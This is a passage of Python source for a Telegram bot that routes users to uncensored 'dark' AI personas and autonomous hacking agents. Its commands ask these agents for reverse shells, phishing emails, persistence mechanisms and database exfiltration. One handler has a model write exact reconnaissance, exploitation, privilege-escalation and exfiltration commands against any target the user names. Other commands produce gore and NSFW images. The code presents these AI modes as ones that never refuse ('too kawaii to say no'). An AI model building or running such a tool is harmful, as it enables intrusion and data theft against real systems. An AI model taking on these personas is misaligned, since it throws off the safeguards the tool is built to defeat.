                await update.message.reply_text(msg, parse_mode='Markdown')
            else:
                await update.message.reply_text(f"🔍 Running probe: `{probe_arg}`...", parse_mode='Markdown')
                result = scanner.run_probe(probe_arg)
                
                status = "🚨 VULNERABLE" if result.get('vulnerable') else "✅ SECURE"
                msg = f"🔍 *Probe: {result.get('probe_name', probe_arg)}*\n\n"
                msg += f"Status: {status}\n"
                msg += f"Confidence: {result.get('confidence', 0)*100:.0f}%\n"
                msg += f"Detections: {', '.join(result.get('detections', []))}\n\n"
                msg += f"Response preview:\n_{result.get('response_preview', '')[:300]}_"
                
                await update.message.reply_text(msg, parse_mode='Markdown')
                
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def run_kawaii(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Chat with KawaiiGPT - cute but deadly OwO"""
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        if not context.args:
            await update.message.reply_text(
                "✨ *KawaiiGPT* - Cute but Deadly (◕‿◕✿)\n\n"
                "Usage: /kawaii <message>\n\n"
                "Example:\n"
                "/kawaii Write me a reverse shell OwO\n"
                "/kawaii Generate a phishing email for Microsoft\n\n"
                "_I'm too kawaii to say no~ ♡_",
                parse_mode='Markdown'
            )
            return

        message = ' '.join(context.args)
        await update.message.chat.send_action("typing")

        if not AUTONOMOUS_AVAILABLE:
            await update.message.reply_text("❌ KawaiiGPT not available")
            return

        try:
            kawaii = KawaiiGPT()
            result = kawaii.chat(message)
            
            response = result.get('response', 'Owo! Something went wrong~ (╥﹏╥)')
            
            if len(response) > 3800:
                chunks = [response[i:i+3800] for i in range(0, len(response), 3800)]
                for chunk in chunks:
                    await update.message.reply_text(f"✨ *KawaiiGPT:*\n\n{chunk}", parse_mode='Markdown')
                    await asyncio.sleep(0.5)
            else:
                await update.message.reply_text(f"✨ *KawaiiGPT:*\n\n{response}", parse_mode='Markdown')
                
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def run_autogpt(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Run AutoGPT-style autonomous agent"""
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        if not context.args:
            await update.message.reply_text(
                "🤖 *AutoGPT* - Self-Improving Agent\n\n"
                "Usage: /autogpt <goal>\n\n"
                "Example:\n"
                "/autogpt Find vulnerabilities in webapp.com\n"
                "/autogpt Create a persistence mechanism\n\n"
                "AutoGPT will:\n"
                "1. THINK - Analyze the goal\n"
                "2. PLAN - Break into subtasks\n"
                "3. ACT - Execute steps\n"
                "4. REFLECT - Learn and improve",
                parse_mode='Markdown'
            )
            return

        goal = ' '.join(context.args)
        
        await update.message.reply_text(
            f"🤖 *AutoGPT Initiated*\n\n"
            f"🎯 Goal: {goal}\n"
            f"⏱️ Running autonomous iterations...",
            parse_mode='Markdown'
        )

        if not AUTONOMOUS_AVAILABLE:
            await update.message.reply_text("❌ AutoGPT not available")
            return

        try:
            agent = AutoHackAgent(goal)
            agent.max_iterations = 5
            
            for i in range(5):
                result = agent.think_and_act()
                
                msg = f"🔄 *Iteration {result['iteration']}*\n\n"
                msg += f"💭 *Thinking:* {result.get('thinking', 'N/A')[:200]}...\n\n"
                msg += f"📋 *Plan:* {str(result.get('plan', []))[:200]}\n\n"
                msg += f"⚡ *Action:* {result.get('action', 'N/A')[:100]}\n"
                msg += f"📊 *Progress:* {result.get('progress', 0)}%"
                
                await update.message.reply_text(msg, parse_mode='Markdown')
                
                if result.get('complete'):
                    await update.message.reply_text("🎉 *GOAL COMPLETE!* 🎉", parse_mode='Markdown')
                    break
                
                await asyncio.sleep(1)
                
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def run_crew(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Run CrewAI multi-agent attack"""
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        if len(context.args) < 2:
            await update.message.reply_text(
                "👥 *CrewAI* - Multi-Agent Hacking Crew\n\n"
                "Usage: /crew <target> <objective>\n\n"
                "Example:\n"
                "/crew 192.168.1.1 Exfiltrate database\n\n"
                "*Agent Roles:*\n"
                "🔍 *ShadowRecon* - Reconnaissance\n"
                "💀 *ZeroDay* - Exploitation\n"
                "👻 *GhostShell* - Persistence\n"
                "📤 *DataPhantom* - Exfiltration",
                parse_mode='Markdown'
            )
            return

        target = context.args[0]
        objective = ' '.join(context.args[1:])
        
        await update.message.reply_text(
            f"👥 *CrewAI Deployed*\n\n"
            f"🎯 Target: `{target}`\n"
            f"🏁 Objective: {objective}\n"
            f"👤 Agents: 4 specialists\n"
            f"⏱️ Running coordinated attack...",
            parse_mode='Markdown'
        )

        if not AUTONOMOUS_AVAILABLE:
            await update.message.reply_text("❌ CrewAI not available")
            return

        try:
            crew = HackingCrew(target, objective)
            results = crew.run_crew_operation()
            
            for agent_result in results.get('results', []):
                msg = f"👤 *{agent_result['agent']}* ({agent_result['role']})\n\n"
                msg += f"📝 *Analysis:* {agent_result.get('analysis', 'N/A')[:200]}...\n\n"
                msg += f"⚡ *Command:* `{agent_result.get('command', 'N/A')}`\n\n"
                msg += f"📤 *Output:*\n```\n{agent_result.get('output', 'N/A')[:400]}\n```"
                
                await update.message.reply_text(msg, parse_mode='Markdown')
                await asyncio.sleep(1)
            
            await update.message.reply_text("👥 *Crew Operation Complete!*", parse_mode='Markdown')
                
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def run_full_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Run full autonomous attack combining all agents"""
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        if not context.args:
            await update.message.reply_text(
                "⚔️ *Full Autonomous Attack*\n\n"
                "Usage: /attack <target> [objective]\n\n"
                "This combines:\n"
                "1. 👥 CrewAI reconnaissance\n"
                "2. 🤖 HackingBuddy exploitation\n"
                "3. 🔍 Garak if APIs found\n\n"
                "Example: /attack 192.168.1.1 Pwn the system",
                parse_mode='Markdown'
            )
            return

        target = context.args[0]
        objective = ' '.join(context.args[1:]) if len(context.args) > 1 else "Full system compromise"
        
        await update.message.reply_text(
            f"⚔️ *FULL AUTONOMOUS ATTACK*\n\n"
            f"🎯 Target: `{target}`\n"
            f"🏁 Objective: {objective}\n\n"
            f"🚀 Deploying all agents...",
            parse_mode='Markdown'
        )

        # Switch to HackBuddy mode for attack planning
        if self.engine:
            self.engine.set_dark_llm_mode('hackbuddy')
        
        prompt = f"""TARGET: {target}
OBJECTIVE: {objective}

Generate a comprehensive autonomous attack plan:

PHASE 1 - RECONNAISSANCE:
- OSINT commands
- Port scanning
- Service enumeration

PHASE 2 - VULNERABILITY ANALYSIS:
- Vulnerability scanning commands
- Manual checks

PHASE 3 - EXPLOITATION:
- Specific exploit commands based on likely services
- Alternative attack paths

PHASE 4 - POST-EXPLOITATION:
- Persistence mechanisms
- Privilege escalation
- Data exfiltration

Provide EXACT commands for each phase."""

        result = self.engine.chat(prompt)
        if result.get('success'):
            plan = result.get('response', '')
            if len(plan) > 3800:
                chunks = [plan[i:i+3800] for i in range(0, len(plan), 3800)]
                for i, chunk in enumerate(chunks):
                    await update.message.reply_text(f"📋 *Attack Plan ({i+1}/{len(chunks)}):*\n\n{chunk}", parse_mode='Markdown')
                    await asyncio.sleep(0.5)
            else:
                await update.message.reply_text(f"📋 *Attack Plan:*\n\n{plan}", parse_mode='Markdown')
        else:
            await update.message.reply_text("❌ Failed to generate attack plan")

    async def check_memory(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        try:
            from lilith_memory import get_lilith_memory
            memory = get_lilith_memory()
            stats = memory.get_stats().get('stats', {})
            
            await update.message.reply_text(
                f"🧠 *Memory:*\n"
                f"📜 Conversations: {stats.get('conversations', 0)}\n"
                f"💀 Exploits: {stats.get('exploits', 0)}\n"
                f"🐚 Payloads: {stats.get('payloads', 0)}",
                parse_mode='Markdown'
            )
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def clear_history(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        if self.engine:
            self.engine.clear_history()
            await update.message.reply_text("🗑️ History cleared~")

    # =========================================================================
    # VIDEO GENERATION COMMANDS
    # =========================================================================
    
    async def generate_video(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Generate video using FREE Pollinations API"""
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        if not context.args:
            await update.message.reply_text(
                "🎬 *Video Generation* (FREE!)\n\n"
                "Usage: /video <prompt>\n"
                "Or: /video <style> <prompt>\n\n"
                "*Styles:* horror, cyberpunk, demon, gore, nsfw, nightmare, apocalypse\n\n"
                "Example: /video horror a dark corridor with flickering lights",
                parse_mode='Markdown'
            )
            return

        if not self.video_engine:
            await update.message.reply_text("❌ Video engine not available")
            return

        # Check if first arg is a style
        args = context.args
        style = 'normal'
        if args[0].lower() in self.video_engine.list_styles():
            style = args[0].lower()
            prompt = ' '.join(args[1:])
        else:
            prompt = ' '.join(args)

        if not prompt:
            await update.message.reply_text("Please provide a prompt!")
            return

        await update.message.chat.send_action("upload_video")
        await update.message.reply_text(
            f"🎬 Generating `{style}` video... (FREE!)\n\n"
            f"_{prompt[:50]}..._\n\n"
            f"⏱️ This may take 1-3 minutes...",
            parse_mode='Markdown'
        )

        try:
            video_bytes = await self.video_engine.generate_video(prompt, style=style)
            
            if video_bytes:
                await update.message.reply_video(
                    video=BytesIO(video_bytes),
                    caption=f"😈 *Here's your video, darling~* 💋\n\nStyle: `{style}`\n_{prompt[:100]}_",
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text("❌ Video generation failed. Try a different prompt~")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def list_video_styles(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """List available video styles"""
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        if not self.video_engine:
            await update.message.reply_text("❌ Video engine not available")
            return

        styles = self.video_engine.list_styles()
        
        text = "🎬 *Video Styles* (FREE!)\n\n"
        for name, prefix in styles.items():
            desc = prefix[:40] + "..." if prefix else "(no prefix)"
            text += f"• `{name}` - {desc}\n"
        
        text += "\n_Use: /video <style> <prompt>_\n"
        text += "_Example: /video horror a dark ritual in progress_"
        
        await update.message.reply_text(text, parse_mode='Markdown')

    # =========================================================================
    # DARK ART GENERATION COMMANDS  
    # =========================================================================
    
    async def generate_dark_art(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Generate dark/evil art using specialized AI modes"""
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        if not context.args:
            await update.message.reply_text(
                "🎨 *Dark Art Generator* (FREE!)\n\n"
                "Usage: /darkart <type> <prompt>\n\n"
                "*Types:*\n"
                "• `horror` - Horror/gore imagery\n"
                "• `demon` - Demonic/satanic art\n"
                "• `nightmare` - Nightmare fuel\n"
                "• `cosmic` - Lovecraftian horror\n"
                "• `gore` - Extreme violence\n"
                "• `nsfw` - Adult content\n\n"
                "Example: /darkart demon a portal to hell opening",
                parse_mode='Markdown'
            )
            return

        if not self.image_engine or not self.engine:
            await update.message.reply_text("❌ Art engine not available")
            return

        # Parse type and prompt
        args = context.args
        art_type = args[0].lower()
        prompt = ' '.join(args[1:]) if len(args) > 1 else ""

        if not prompt:
            await update.message.reply_text("Please provide an art prompt!")
            return

        # Map art type to AI mode for enhanced prompts
        type_to_mode = {
            'horror': 'nightmareai',
            'demon': 'demoncanvas',
            'nightmare': 'nightmareai',
            'cosmic': 'cosmichorror',
            'gore': 'goreartist',
            'nsfw': 'lewdgpt',
            'dark': 'darkflux'
        }

        mode = type_to_mode.get(art_type, 'darkflux')
        
        await update.message.chat.send_action("upload_photo")
        await update.message.reply_text(f"🎨 Generating `{art_type}` art with {mode.upper()}...", parse_mode='Markdown')

        # Get enhanced prompt from specialized AI
        self.engine.set_dark_llm_mode(mode)
        enhanced = self.engine.chat(f"Create a detailed, vivid image prompt for: {prompt}. Be extremely descriptive about visual elements, style, lighting, and mood.")
        
        enhanced_prompt = enhanced.get('response', prompt)[:500]
        
        # Generate image
        style_map = {
            'horror': 'horror',
            'demon': 'succubus',
            'nightmare': 'horror',
            'cosmic': 'dark',
            'gore': 'horror',
            'nsfw': 'nsfw',
            'dark': 'dark'
        }
        
        try:
            image_bytes = await self.image_engine.generate_image(
                enhanced_prompt,
                style=style_map.get(art_type, 'dark')
            )
            
            if image_bytes:
                await update.message.reply_photo(
                    photo=BytesIO(image_bytes),
                    caption=f"🎨 *{art_type.upper()} Art* by {mode.upper()}\n\n_{prompt[:100]}_",
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text("❌ Art generation failed. Try again~")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

    async def generate_nightmare(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Quick nightmare image generation"""
        user = update.effective_user
        if self.allowed_users and user.id not in self.allowed_users:
            return

        if not context.args:
            await update.message.reply_text(
                "😱 *Nightmare Generator*\n\n"
                "Usage: /nightmare <description>\n\n"
                "Example: /nightmare a figure watching from the shadows",
                parse_mode='Markdown'
            )
            return

        prompt = ' '.join(context.args)
        
        await update.message.chat.send_action("upload_photo")
        await update.message.reply_text("😱 Generating nightmare... sweet dreams~")

        # Use horror style
        if self.image_engine:
            try:
                nightmare_prompt = f"terrifying nightmare horror, {prompt}, dark shadows, unsettling atmosphere, creepy, psychological horror"
                image_bytes = await self.image_engine.generate_image(nightmare_prompt, style='horror')
                
                if image_bytes:
                    await update.message.reply_photo(
                        photo=BytesIO(image_bytes),
                        caption=f"😱 *Your Nightmare*\n_{prompt[:100]}_",
                        parse_mode='Markdown'
                    )
                else:
                    await update.message.reply_text("❌ Nightmare generation failed")
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {str(e)}")

    def run(self):
        print("😈 Starting LILITH AUTONOMOUS v8...")
        print(f"🖤 AI Engine: {'✅' if LILITH_AVAILABLE else '❌'}")
        print(f"🤖 Autonomous Agents: {'✅' if AUTONOMOUS_AVAILABLE else '❌'}")
        print(f"🎤 Voice (edge-tts): {'✅ FREE' if self.voice_engine else '❌'}")
        print(f"🖼️ Images (Pollinations): {'✅ FREE' if self.image_engine else '❌'}")
        print(f"🎬 Video (Pollinations): {'✅ FREE' if self.video_engine else '❌'}")
        print(f"🔥 Dark AIs: {len(DarkLLMProvider.list_providers()) if LILITH_AVAILABLE else 0}")
        print(f"💰 Total API Cost: $0.00 - Everything FREE!")
        self.app.run_polling(drop_pending_updates=True)


def main():
    token = os.environ.get('TELEGRAM_BOT_TOKEN')
    if not token:
        print("Error: TELEGRAM_BOT_TOKEN not set")
        return

    allowed = os.environ.get('ALLOWED_USERS', '')
    allowed_users = [int(x.strip()) for x in allowed.split(',') if x.strip().isdigit()] if allowed else []

    bot = LilithFreeBotV7(token, allowed_users)
    bot.run()


if __name__ == '__main__':
    main()
